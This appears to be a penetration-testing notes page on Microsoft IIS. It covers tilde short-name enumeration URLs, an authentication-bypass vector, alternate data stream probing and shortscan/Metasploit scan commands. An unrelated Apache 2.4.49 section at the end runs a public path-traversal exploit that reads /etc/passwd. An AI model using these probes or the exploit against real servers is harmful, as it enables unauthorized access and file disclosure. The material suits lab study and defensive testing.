---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# IIS

## 101

**IIS (Internet Information Services)** is a <mark style="background-color:yellow;">web server software made by Microsoft</mark>. It runs on Windows and is used to host websites, web applications, and services. It's commonly used for websites built with `ASP.NET` and other Microsoft technologies.

### Directories

<table data-header-hidden><thead><tr><th width="122"></th><th>Location</th></tr></thead><tbody><tr><td><strong>Webroot</strong></td><td><code>C:\inetpub\wwwroot\</code></td></tr><tr><td><strong>Config</strong></td><td><ul><li><code>%windir%\System32\inetsrv\config\applicationHost.config</code></li><li><code>C:\inetpub\wwwroot\web.config</code></li></ul></td></tr><tr><td><strong>Logs</strong></td><td><code>C:\inetpub\logs\LogFiles\</code></td></tr></tbody></table>

## Attacks

### Tilde Flaw

{% hint style="info" %}
The below information is based on [_Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure_](https://soroush.me/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf) paper.
{% endhint %}

#### Dirbusting

In older versions of Microsoft’s IIS, there's a way to discover hidden files and folders using something called **8.3 short file names**. These are legacy DOS-style names (e.g., `SECRET~1.HTM`) automatically created for files like `AcSecret.html`. By using the tilde character (`~`) in a crafted URL, we can <mark style="background-color:yellow;">enumerate or guess these hidden names</mark>, even if the files are protected or not listed publicly.

When a server uses **short file names**, it maps a long filename like `AcSecret.html` to a short one like `ACSECR~1.HTM`. This behavior can be abused via URLs with wildcards (`*`, `?`) and the tilde `~`. For example:

```bash
http://victim.com/acsecr~1.htm/.aspx
```

If the server responds with a `404 (not found)` instead of a `400 (bad request)`, it means the file exists — we've guessed part of a real filename! We can refine the guess:

1. Use `a*~1*/.aspx` to test if a file starts with `a`
2. Keep adjusting letters (`ab*`, `ac*`, etc.) until the server gives clues

The `.aspx` at the end of the URL is used due to a <mark style="background-color:yellow;">behavioral quirk of IIS</mark> that can be exploited to detect existing 8.3 names via different HTTP responses. <mark style="background-color:yellow;">IIS needs a valid extension at the end to route the request correctly</mark>. If the URL ends in something non-executable like `.htm` or no extension, IIS may return a generic response (like a `404` or `403`) instead of a behavior we can differentiate.

Adding `/.aspx` (or `/anything.aspx`) can <mark style="background-color:yellow;">force IIS to treat the path as a route to an</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`ASP.NET`</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">resource</mark>, and might produce different error codes depending on whether the target file/folder actually exists or not. Let’s say we try:

```
http://victim.com/secretfo~1/
```

If it doesn’t exist will respond with `404 Not Found`, but if it exists might still give `404` or `403` depending on settings. On the other hand, if we try:

```
http://victim.com/secretfo~1/.aspx
```

If the folder exists, IIS may return a `403 (Forbidden)` , where if it doesn’t exist, it may return a `404 (Not Found)`.

#### Bypassing Authentication

Even if a folder is protected with login prompts (like Basic or Windows auth), we can still enumerate files using a trick:

```php
/ProtectedFolder::$Index_Allocation/*~1*/.aspx
```

This vector bypasses the login wall and lets us see what's inside **as long as short names exist**.

#### **Alternate Data Streams**

NTFS[^1], the default file system used by modern versions of Windows, has a feature called **ADS** that can help us check if a file exists based on the HTTP responses:

```bash
/filename.html::$data/~1/.aspx
```

A `404` usually means the file is there, just not accessible directly.

#### Tools

The tilde enumeration can be automated using tools such as the [`shortscan`](https://github.com/bitquark/shortscan):or MSF's `iis_shortname_scanner` module:

{% tabs %}
{% tab title="shortscan" %}
```bash
# Single target
$ shortscan http://example.org/

# File with a list of URLs
$ shortscan @urls.txt
```
{% endtab %}

{% tab title="iis_shortname_scanner" %}
{% code overflow="wrap" %}
```bash
# Initial scan
$ sudo msfconsole -q -x "use auxiliary/scanner/http/iis_shortname_scanner; set RHOSTS <target>; run;"

# Targeted scan
sudo msfconsole -q -x "use auxiliary/scanner/http/iis_shortname_scanner; set RHOSTS <target>; set path /dev/dca66d38fd916317687e1390a420c3fc; run;"
```
{% endcode %}
{% endtab %}
{% endtabs %}

## v2.4.49

{% code overflow="wrap" %}
```bash
# Search for public exploits
$ searchsploit Apache httpd 2.4.49
...
--------------------------------------------------------------------------
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE) | multiple/webapps/50383.sh
--------------------------------------------------------------------------

# Create a file with the target's socket
$ echo "192.168.X.245:8000" > web01_ip.txt

# Exploit the target
$ ./50383.sh web01_ip.txt /etc/passwd
http://192.168.X.245:8000
root:x:0:0:root:/root:/bin/bash
...
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
```
{% endcode %}

[^1]: New Technology File System
